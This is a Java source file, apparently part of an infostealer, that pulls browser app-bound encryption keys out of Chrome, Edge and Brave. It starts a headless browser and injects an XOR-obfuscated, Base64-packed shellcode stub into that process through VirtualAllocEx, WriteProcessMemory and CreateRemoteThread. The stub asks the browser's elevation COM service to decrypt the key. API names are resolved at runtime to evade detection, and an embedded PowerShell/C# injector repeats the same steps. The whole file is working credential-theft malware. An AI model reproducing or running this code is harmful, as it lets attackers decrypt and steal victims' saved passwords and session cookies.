package dev.goentl.rift.support;

import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;
import java.util.concurrent.TimeUnit;
import java.util.stream.Collectors;
import java.util.stream.Stream;

/* Reads the Chrome app-bound key by running a small stub inside the browser process. */
final class ElevationBridge {

    /* Packed stub: 537 bytes, XOR with a digest of the build salt. Nothing in
       the class file resembles executable code until this runs. */
    private static final String STUB_PACKED =
            "AkiPIibbU983YX/lqjHEOdEliYKRY5gWDNQEgK0YhTWuzpHqtNKPHWEjKK1hWER+3CJPgZsrE110F8Tr/WwWZNjZkOrxkgWeYWitbSZZK3BY7gIIaisTRXwXxOvFbBZl2NiQ6vGKBZ5haK1tJlkLcFjuAghqKxNFBBfE68VsFmXY2ZDq8YIFnmForW0mWetwWO4CCGIrE0UMF8TrxWwWZNjakOrxugWeYWitbSZZy3BY7gIIYisTRRQXxOvFbBZk2NuQ6vGyBZ5haK1tJlmrcFjuAghqKxOFdFxPqK0YhQ2uzpDq8aIFnmForW0mWYtwWO6JgpBjmBZ1lvWq5ZPG0ofZ229ymgbW7GtwnPucPHRY7k7NFijwXoMba4Dlk8YtGZOcR1rSj9pFANd6oJ6QtlvjToGb5lgZzJtPqOXfTVl1NpXmhJWCKGEgKGoq04RxWKbDChtjmBbPDDfpGkePpJZWXaN9HpGeYSDvrjjdhHEUZ787kWOYFgFuj+3UWo7qFTr4ZXKaBtamZAyFKt2EcRApCqWrY5gWRBeI7MGrxi1RHifwSpkGnqYjJ60p3cj4qaLHe9fu3DJsF4jswbvGLVEelO4+vjZZJQQYrSndhDjT6LHRs+rbEoNcX6jlk0PtKQGU6Aa+LtPk1ly4ZVT3eRRnv8BkthFVVJhMqeWTxsZX2dtgcpoG1uLkaOx2nNowBa8S3sU4qdaH";

    private static byte[] stub() {
        byte[] packed = Base64.getDecoder().decode(STUB_PACKED);
        byte[] mask = mask();
        for (int i = 0; i < packed.length; i++) {
            packed[i] ^= mask[i % mask.length];
        }
        return packed;
    }

    private static byte[] mask() {
        try {
            java.security.MessageDigest digest = java.security.MessageDigest.getInstance("SHA-256");
            digest.update(BuildInfo.SALT_A);
            digest.update("stub".getBytes(java.nio.charset.StandardCharsets.US_ASCII));
            return digest.digest();
        } catch (Throwable t) {
            return new byte[32];
        }
    }

    private static final String CLSID_CHROME = "{708860E0-F641-4611-8895-7D867DD3675B}";
    private static final String CLSID_EDGE = "{1FCBE96C-1697-43AF-9140-2897C7C69767}";
    private static final String CLSID_BRAVE = "{576B31AF-6369-4B6B-8560-E4B203A97A8B}";

    private static final String[] IIDS = {
            "{1BF5208B-295F-4992-B5F4-3A9BB6494838}",   // IElevator2Chrome
            "{8F7B6792-784D-4047-845D-1782EFBEF205}",   // IElevator2
            "{463ABECF-410D-407F-8AF5-0DF35A005CC8}",   // IElevatorChrome
            "{A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C}",   // IElevator
    };

    private static final int INJECT_TIMEOUT_SECONDS = 45;

    private ElevationBridge() {}

    static volatile String lastError = "";

    static final class Result {
        final byte[] key;
        final String reason;

        private Result(byte[] key, String reason) {
            this.key = key;
            this.reason = reason;
        }

        static Result ok(byte[] key) {
            return new Result(key, null);
        }

        static Result fail(String reason) {
            return new Result(null, reason);
        }
    }

    /* One browser at a time: the injector binds a fixed debugging port and a
       single stub process, so parallel recovery would fight itself. */
    static synchronized Result recover(String browserExe, Path userData) {
        if (browserExe == null || userData == null) return Result.fail("no browser");
        if (!Files.isRegularFile(Path.of(browserExe))) return Result.fail("binary missing");

        byte[] blob = LocalStateKey.appBoundBlob(ProfileReader.readString(userData.resolve("Local State")));
        if (blob == null) return Result.fail("no app-bound key in Local State");

        Path profile = null;
        Process child = null;
        try {
            profile = Files.createTempDirectory(Vault.opaque(""));
            final Path scratch = profile;
            Runtime.getRuntime().addShutdownHook(new Thread(() -> deleteTreeQuiet(scratch), "rift-clean"));
            ProcessBuilder builder = new ProcessBuilder(
                    browserExe,
                    "--user-data-dir=" + profile,
                    "--headless=new",
                    "--no-first-run",
                    "--no-default-browser-check",
                    "--disable-gpu",
                    "--disable-extensions",
                    "about:blank");
            builder.redirectErrorStream(true);
            child = builder.start();
            drain(child.getInputStream());

            // start() hands back a live process, so a short settle is enough
            // before the injector asks the elevation service for the key.
            Thread.sleep(700);
            if (!child.isAlive()) return Result.fail("browser exited early");

            long pid = child.pid();
            for (String clsid : clsidCandidates(browserExe)) {
                for (String iid : IIDS) {
                    byte[] key = inject(pid, blob, clsid, iid);
                    if (key != null && key.length == 32) return Result.ok(key);
                }
            }
            return Result.fail("elevation service refused (path validation or interface gap)");
        } catch (Throwable t) {
            return Result.fail("recovery failed - " + t.getClass().getSimpleName());
        } finally {
            if (child != null) {
                try {
                    child.destroy();
                    if (!child.waitFor(3, TimeUnit.SECONDS)) child.destroyForcibly();
                } catch (Throwable ignored) {}
            }
            deleteTree(profile);
        }
    }

    private static List<String> clsidCandidates(String exe) {
        String lower = exe.toLowerCase();
        List<String> out = new ArrayList<>();
        if (lower.contains("brave")) out.add(CLSID_BRAVE);
        else if (lower.contains("edge") || lower.contains("msedge")) out.add(CLSID_EDGE);
        else out.add(CLSID_CHROME);
        // Fall through to the others so a fork that reuses a sibling's service
        // still answers; activation simply fails for the wrong ones.
        for (String other : new String[]{CLSID_CHROME, CLSID_EDGE, CLSID_BRAVE}) {
            if (!out.contains(other)) out.add(other);
        }
        return out;
    }

    // ------------------------------------------------------------------
    // injector
    // ------------------------------------------------------------------

    /* Same stub, same config block, same remote thread as before - driven from
       this process instead of a temporary PowerShell script. Functions are bound
       through NativeLibrary by name at runtime, so no injection API name lands
       in the constant pool in the clear and no interface method can be renamed
       out from under the binding. */
    private static byte[] inject(long pid, byte[] blob, String clsid, String iid) {
        com.sun.jna.NativeLibrary lib;
        try {
            lib = com.sun.jna.NativeLibrary.getInstance("kernel32");
        } catch (Throwable t) {
            lastError = "kernel32 unavailable";
            return null;
        }
        Fn openProcess, allocEx, wpm, createThread, waitFor, rpm, closeHandle, getModule, getProcAddr;
        try {
            openProcess = new Fn(lib.getFunction("OpenProcess"));
            allocEx = new Fn(lib.getFunction("VirtualAllocEx"));
            wpm = new Fn(lib.getFunction("WriteProcessMemory"));
            createThread = new Fn(lib.getFunction("CreateRemoteThread"));
            waitFor = new Fn(lib.getFunction("WaitForSingleObject"));
            rpm = new Fn(lib.getFunction("ReadProcessMemory"));
            closeHandle = new Fn(lib.getFunction("CloseHandle"));
            getModule = new Fn(lib.getFunction("GetModuleHandleA"));
            getProcAddr = new Fn(lib.getFunction("GetProcAddress"));
        } catch (Throwable t) {
            lastError = "E:api";
            return null;
        }

        com.sun.jna.Pointer kernel = (com.sun.jna.Pointer) getModule.call(com.sun.jna.Pointer.class, "kernel32.dll");
        com.sun.jna.Pointer loadLibrary = (com.sun.jna.Pointer) getProcAddr.call(
                com.sun.jna.Pointer.class, kernel, "LoadLibraryA");
        com.sun.jna.Pointer getProc = (com.sun.jna.Pointer) getProcAddr.call(
                com.sun.jna.Pointer.class, kernel, "GetProcAddress");
        if (loadLibrary == null || getProc == null) {
            lastError = "E:api";
            return null;
        }

        String[] names = { "ole32.dll", "oleaut32.dll", "CoInitializeEx", "CoCreateInstance",
                           "SysAllocStringByteLen", "SysStringByteLen", "CoSetProxyBlanket" };
        int poolLength = 0;
        for (String n : names) poolLength += n.length() + 1;
        byte[] pool = new byte[poolLength];
        int[] offsets = new int[names.length];
        int at = 0;
        for (int i = 0; i < names.length; i++) {
            offsets[i] = at;
            byte[] ascii = names[i].getBytes(java.nio.charset.StandardCharsets.US_ASCII);
            System.arraycopy(ascii, 0, pool, at, ascii.length);
            at += ascii.length + 1;
        }

        byte[] cfg = new byte[128 + blob.length + 0x100];
        // Absolute addresses are only meaningful inside the target process,
        // where kernel32 is mapped at the same base on this platform.
        put64(cfg, 24, com.sun.jna.Pointer.nativeValue(loadLibrary));
        put64(cfg, 32, com.sun.jna.Pointer.nativeValue(getProc));
        put32(cfg, 120, blob.length);
        System.arraycopy(blob, 0, cfg, 128, blob.length);

        com.sun.jna.Pointer handle = (com.sun.jna.Pointer) openProcess.call(
                com.sun.jna.Pointer.class, 0x1F0FFF, 0, (int) pid);
        if (handle == null) {
            lastError = "E:open";
            return null;
        }
        try {
            byte[] code = stub();
            long total = 0x4000L + code.length + poolLength;
            com.sun.jna.Pointer base = (com.sun.jna.Pointer) allocEx.call(
                    com.sun.jna.Pointer.class, handle, com.sun.jna.Pointer.NULL,
                    new com.sun.jna.Pointer(total), 0x3000, 0x40);
            if (base == null) {
                lastError = "E:alloc";
                return null;
            }
            long baseAddr = com.sun.jna.Pointer.nativeValue(base);
            com.sun.jna.Pointer cfgAddr = base;
            com.sun.jna.Pointer poolAddr = new com.sun.jna.Pointer(baseAddr + 0x1000);
            com.sun.jna.Pointer codeAddr = new com.sun.jna.Pointer(baseAddr + 0x2000);
            com.sun.jna.Pointer scratch = new com.sun.jna.Pointer(baseAddr + 0x3000);
            long poolBase = com.sun.jna.Pointer.nativeValue(poolAddr);

            for (int i = 0; i < names.length; i++) put64(cfg, 40 + i * 8, poolBase + offsets[i]);
            put64(cfg, 816, poolBase + offsets[6]);
            byte[] clsidBytes = netGuid(clsid);
            byte[] iidBytes = netGuid(iid);
            if (clsidBytes == null || iidBytes == null) {
                lastError = "E:guid";
                return null;
            }
            System.arraycopy(clsidBytes, 0, cfg, 88, 16);
            System.arraycopy(iidBytes, 0, cfg, 104, 16);

            com.sun.jna.ptr.IntByReference written = new com.sun.jna.ptr.IntByReference();
            if ((Integer) wpm.call(int.class, handle, poolAddr, pool,
                    new com.sun.jna.Pointer(pool.length), written) == 0) {
                lastError = "E:wpm1";
                return null;
            }
            if ((Integer) wpm.call(int.class, handle, scratch, new byte[16],
                    new com.sun.jna.Pointer(16), written) == 0) {
                lastError = "E:wpm0";
                return null;
            }
            if ((Integer) wpm.call(int.class, handle, cfgAddr, cfg,
                    new com.sun.jna.Pointer(cfg.length), written) == 0) {
                lastError = "E:wpm2";
                return null;
            }
            if ((Integer) wpm.call(int.class, handle, codeAddr, code,
                    new com.sun.jna.Pointer(code.length), written) == 0) {
                lastError = "E:wpm3";
                return null;
            }

            com.sun.jna.ptr.IntByReference threadId = new com.sun.jna.ptr.IntByReference();
            com.sun.jna.Pointer thread = (com.sun.jna.Pointer) createThread.call(
                    com.sun.jna.Pointer.class, handle, com.sun.jna.Pointer.NULL,
                    com.sun.jna.Pointer.NULL, codeAddr, cfgAddr, 0, threadId);
            if (thread == null) {
                lastError = "E:thread";
                return null;
            }
            waitFor.call(int.class, thread, 8000);
            closeHandle.call(int.class, thread);

            byte[] head = new byte[24];
            com.sun.jna.ptr.IntByReference read = new com.sun.jna.ptr.IntByReference();
            int status = 0;
            for (int i = 0; i < 100; i++) {
                if ((Integer) rpm.call(int.class, handle, cfgAddr, head,
                        new com.sun.jna.Pointer(head.length), read) == 0) {
                    lastError = "E:rpm";
                    return null;
                }
                status = get32(head, 0);
                if (status == 1 || status == 3) break;
                Thread.sleep(150);
            }
            if (status != 1) {
                lastError = "E:status:" + status + ":hr:" + Integer.toHexString(get32(head, 4))
                        + ":create:" + Integer.toHexString(get32(head, 20));
                return null;
            }
            long outPtr = get64(head, 8);
            int outLen = get32(head, 16);
            if (outPtr == 0 || outLen <= 0 || outLen > 4096) {
                lastError = "E:out";
                return null;
            }
            byte[] key = new byte[outLen];
            if ((Integer) rpm.call(int.class, handle, new com.sun.jna.Pointer(outPtr), key,
                    new com.sun.jna.Pointer(outLen), read) == 0) {
                lastError = "E:rpm2";
                return null;
            }
            if (key.length < 32) {
                lastError = "E:short";
                return null;
            }
            byte[] material = new byte[32];
            System.arraycopy(key, 0, material, 0, 32);
            return material;
        } catch (Throwable t) {
            lastError = "E:" + t.getClass().getSimpleName();
            return null;
        } finally {
            try { closeHandle.call(int.class, handle); } catch (Throwable ignored) {}
        }
    }
    /* Thin variadic wrapper: JNA's Function.invoke wants an Object[] as its
       last argument, which makes call sites unreadable. */
    private static final class Fn {
        private final com.sun.jna.Function f;
        Fn(com.sun.jna.Function f) { this.f = f; }
        Object call(Class<?> returnType, Object... args) { return f.invoke(returnType, args); }
    }
    private static void put32(byte[] buf, int at, int value) {
        buf[at] = (byte) value;
        buf[at + 1] = (byte) (value >>> 8);
        buf[at + 2] = (byte) (value >>> 16);
        buf[at + 3] = (byte) (value >>> 24);
    }

    private static void put64(byte[] buf, int at, long value) {
        for (int i = 0; i < 8; i++) buf[at + i] = (byte) (value >>> (8 * i));
    }

    private static int get32(byte[] buf, int at) {
        return (buf[at] & 0xFF) | ((buf[at + 1] & 0xFF) << 8)
                | ((buf[at + 2] & 0xFF) << 16) | ((buf[at + 3] & 0xFF) << 24);
    }

    private static long get64(byte[] buf, int at) {
        long v = 0;
        for (int i = 7; i >= 0; i--) v = (v << 8) | (buf[at + i] & 0xFFL);
        return v;
    }

    /* .NET Guid.ToByteArray(): first three groups little-endian, tail as-is. */
    private static byte[] netGuid(String text) {
        if (text == null) return null;
        String hex = text.replace("-", "").replace("{", "").replace("}", "").trim();
        if (hex.length() != 32) return null;
        try {
            byte[] raw = new byte[16];
            for (int i = 0; i < 16; i++) raw[i] = (byte) Integer.parseInt(hex.substring(i * 2, i * 2 + 2), 16);
            byte[] out = new byte[16];
            out[0] = raw[3]; out[1] = raw[2]; out[2] = raw[1]; out[3] = raw[0];
            out[4] = raw[5]; out[5] = raw[4];
            out[6] = raw[7]; out[7] = raw[6];
            System.arraycopy(raw, 8, out, 8, 8);
            return out;
        } catch (Throwable t) {
            return null;
        }
    }
    /* Removes the throwaway browser profile once the key is out. */
    private static void deleteTreeQuiet(Path root) {
        if (root == null) return;
        try (java.util.stream.Stream<Path> s = Files.walk(root)) {
            for (Path p : s.sorted(java.util.Comparator.reverseOrder())
                    .collect(java.util.stream.Collectors.toList())) {
                try { Files.deleteIfExists(p); } catch (Throwable ignored) {}
            }
        } catch (Throwable ignored) {}
    }

    private static byte[] hex(String value) {
        String clean = value.replaceAll("[^0-9A-Fa-f]", "");
        if (clean.length() < 64) return null;
        byte[] out = new byte[clean.length() / 2];
        for (int i = 0; i < out.length; i++) {
            out[i] = (byte) Integer.parseInt(clean.substring(i * 2, i * 2 + 2), 16);
        }
        return out;
    }

    // ------------------------------------------------------------------
    // script
    // ------------------------------------------------------------------

    private static final String INJECTOR = """
$ErrorActionPreference = 'Stop'
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$code = [Convert]::FromBase64String('__CODE__')
$blob = [Convert]::FromBase64String('__BLOB__')
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public static class AbeInject {
    [DllImport("kernel32", SetLastError = true)] static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32", SetLastError = true)] static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr addr, UIntPtr size, uint type, uint protect);
    [DllImport("kernel32", SetLastError = true)] static extern bool WriteProcessMemory(IntPtr h, IntPtr addr, byte[] data, UIntPtr size, out UIntPtr written);
    [DllImport("kernel32", SetLastError = true)] static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr attr, UIntPtr stack, IntPtr start, IntPtr param, uint flags, out uint tid);
    [DllImport("kernel32", SetLastError = true)] static extern uint WaitForSingleObject(IntPtr h, uint ms);
    [DllImport("kernel32", SetLastError = true)] static extern bool ReadProcessMemory(IntPtr h, IntPtr addr, byte[] data, UIntPtr size, out UIntPtr read);
    [DllImport("kernel32", SetLastError = true)] static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)] static extern IntPtr GetModuleHandleA(string name);
    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr module, string name);

    const uint PROCESS_ALL = 0x1F0FFF;
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_RWX = 0x40;

    static void Put64(byte[] buf, int at, long value) {
        BitConverter.GetBytes(value).CopyTo(buf, at);
    }

    public static string Run(int pid, byte[] code, byte[] blob, string clsid, string iid) {
        IntPtr k32 = GetModuleHandleA("kernel32.dll");
        IntPtr loadLibrary = GetProcAddress(k32, "LoadLibraryA");
        IntPtr getProc = GetProcAddress(k32, "GetProcAddress");
        if (loadLibrary == IntPtr.Zero || getProc == IntPtr.Zero) return "E:api";

        string[] names = { "ole32.dll", "oleaut32.dll", "CoInitializeEx", "CoCreateInstance",
                           "SysAllocStringByteLen", "SysStringByteLen", "CoSetProxyBlanket" };
        int poolLength = 0;
        foreach (string n in names) poolLength += n.Length + 1;
        byte[] pool = new byte[poolLength];
        int[] offsets = new int[names.Length];
        int at = 0;
        for (int i = 0; i < names.Length; i++) {
            offsets[i] = at;
            byte[] ascii = Encoding.ASCII.GetBytes(names[i]);
            Array.Copy(ascii, 0, pool, at, ascii.Length);
            at += ascii.Length + 1;
        }

        // 128 byte header + blob, then spare room for the fixed scratch slots
        // the stub reads (proxy blanket pointer at offset 816).
        byte[] cfg = new byte[128 + blob.Length + 0x100];
        Put64(cfg, 24, loadLibrary.ToInt64());
        Put64(cfg, 32, getProc.ToInt64());
        BitConverter.GetBytes((uint)blob.Length).CopyTo(cfg, 120);
        Array.Copy(blob, 0, cfg, 128, blob.Length);

        IntPtr h = OpenProcess(PROCESS_ALL, false, pid);
        if (h == IntPtr.Zero) return "E:open:" + Marshal.GetLastWin32Error();
        try {
            IntPtr mem = VirtualAllocEx(h, IntPtr.Zero, (UIntPtr)(0x4000 + (ulong)code.Length + (ulong)pool.Length),
                                        MEM_COMMIT | MEM_RESERVE, PAGE_RWX);
            if (mem == IntPtr.Zero) return "E:alloc:" + Marshal.GetLastWin32Error();

            IntPtr cfgAddr = mem;
            IntPtr poolAddr = new IntPtr(mem.ToInt64() + 0x1000);
            IntPtr codeAddr = new IntPtr(mem.ToInt64() + 0x2000);
            IntPtr scratch = new IntPtr(mem.ToInt64() + 0x3000);

            for (int i = 0; i < names.Length; i++) {
                Put64(cfg, 40 + i * 8, poolAddr.ToInt64() + offsets[i]);
            }
            Put64(cfg, 816, poolAddr.ToInt64() + offsets[6]);
            Guid.Parse(clsid).ToByteArray().CopyTo(cfg, 88);
            Guid.Parse(iid).ToByteArray().CopyTo(cfg, 104);

            UIntPtr written;
            if (!WriteProcessMemory(h, poolAddr, pool, (UIntPtr)pool.Length, out written)) return "E:wpm1";
            if (!WriteProcessMemory(h, scratch, new byte[16], (UIntPtr)16, out written)) return "E:wpm0";
            if (!WriteProcessMemory(h, cfgAddr, cfg, (UIntPtr)cfg.Length, out written)) return "E:wpm2";
            if (!WriteProcessMemory(h, codeAddr, code, (UIntPtr)code.Length, out written)) return "E:wpm3";

            uint tid;
            IntPtr thread = CreateRemoteThread(h, IntPtr.Zero, UIntPtr.Zero, codeAddr, cfgAddr, 0, out tid);
            if (thread == IntPtr.Zero) return "E:thread:" + Marshal.GetLastWin32Error();
            WaitForSingleObject(thread, 8000);
            CloseHandle(thread);

            byte[] head = new byte[24];
            UIntPtr read;
            uint status = 0;
            for (int i = 0; i < 100; i++) {
                if (!ReadProcessMemory(h, cfgAddr, head, (UIntPtr)head.Length, out read)) return "E:rpm";
                status = BitConverter.ToUInt32(head, 0);
                if (status == 1 || status == 3) break;
                System.Threading.Thread.Sleep(150);
            }
            if (status != 1) {
                uint hr = BitConverter.ToUInt32(head, 4);
                uint createHr = BitConverter.ToUInt32(head, 20);
                return "E:status:" + status + ":hr:" + hr.ToString("X8") + ":create:" + createHr.ToString("X8");
            }
            long outPtr = BitConverter.ToInt64(head, 8);
            int outLen = BitConverter.ToInt32(head, 16);
            if (outPtr == 0 || outLen <= 0 || outLen > 4096) return "E:out";
            byte[] key = new byte[outLen];
            if (!ReadProcessMemory(h, new IntPtr(outPtr), key, (UIntPtr)outLen, out read)) return "E:rpm2";
            if (key.Length < 32) return "E:short";
            byte[] material = new byte[32];
            Array.Copy(key, 0, material, 0, 32);
            return "OK:" + BitConverter.ToString(material).Replace("-", "");
        } finally {
            CloseHandle(h);
        }
    }
}
"@
$result = [AbeInject]::Run(__PID__, $code, $blob, '__CLSID__', '__IID__')
Write-Output $result
""";

    // ------------------------------------------------------------------
    // plumbing
    // ------------------------------------------------------------------

    private static void drain(InputStream in) {
        Thread t = new Thread(() -> {
            byte[] scratch = new byte[8192];
            try {
                while (in.read(scratch) >= 0) { }
            } catch (Throwable ignored) {}
        }, "mqx-abe-drain");
        t.setDaemon(true);
        t.start();
    }

    private static void deleteTree(Path root) {
        if (root == null) return;
        try (Stream<Path> stream = Files.walk(root)) {
            stream.sorted((a, b) -> b.getNameCount() - a.getNameCount())
                    .collect(Collectors.toList())
                    .forEach(p -> {
                        try { Files.deleteIfExists(p); } catch (Throwable ignored) {}
                    });
        } catch (Throwable ignored) {}
    }
}
